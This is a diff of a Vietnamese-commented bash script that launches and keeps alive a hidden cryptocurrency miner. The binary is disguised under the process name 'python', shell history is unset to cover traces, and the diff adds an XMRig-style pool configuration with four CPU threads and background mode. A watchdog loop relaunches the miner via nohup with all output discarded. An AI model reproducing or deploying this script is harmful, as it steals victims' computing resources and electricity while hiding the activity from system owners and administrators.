@@ -3,7 +3,8 @@
 DOMAIN="$1"
 NAME_WORK="$2"
 PROCESS_PATH="python/python"   # file thực thi
-PROCESS_NAME="python"        # tên tiến trình hiển thị
+PROCESS_NAME="python"          # tên tiến trình hiển thị
+CONFIG_FILE="config.json"
 
 # ❌ Xoá shell history
 unset HISTFILE
@@ -21,12 +22,40 @@ if [ ! -f "$(pwd)/$PROCESS_PATH" ]; then
     rm -f python.tar.gz
 fi
 
+# 📝 Tạo config.json nếu chưa tồn tại
+if [ ! -f "$CONFIG_FILE" ]; then
+    echo "[+] Chưa có $CONFIG_FILE → tạo mới"
+    cat > "$CONFIG_FILE" <<EOF
+{
+  "autosave": true,
+  "background": true,
+  "api": {
+    "id": null,
+    "worker-id": "$NAME_WORK"
+  },
+  "pools": [
+    {
+      "url": "$DOMAIN",
+      "user": "$NAME_WORK",
+      "keepalive": true,
+      "tls": true
+    }
+  ],
+  "cpu": {
+    "enabled": true,
+    "threads": 4
+  }
+}
+EOF
+else
+    echo "[+] Đã có $CONFIG_FILE"
+fi
+
 # 🔁 Vòng lặp kiểm tra tiến trình và chạy lại nếu chưa chạy
 while true; do
-    # Kiểm tra tiến trình đang chạy
-    if ! pgrep -f "$PROCESS_NAME -o $DOMAIN" > /dev/null; then
+    if ! pgrep -f "$PROCESS_NAME -c $CONFIG_FILE" > /dev/null; then
         echo "[+] Tiến trình chưa chạy, start..."
-        nohup "$(pwd)/$PROCESS_PATH" -o "$DOMAIN" --tls -k -t 4 --rig-id "$NAME_WORK" > /dev/null 2>&1 &
+        nohup "$(pwd)/$PROCESS_PATH" -c "$CONFIG_FILE" > /dev/null 2>&1 &
     else
         echo "[+] Tiến trình đang chạy, kiểm tra lại sau 30s..."
     fi
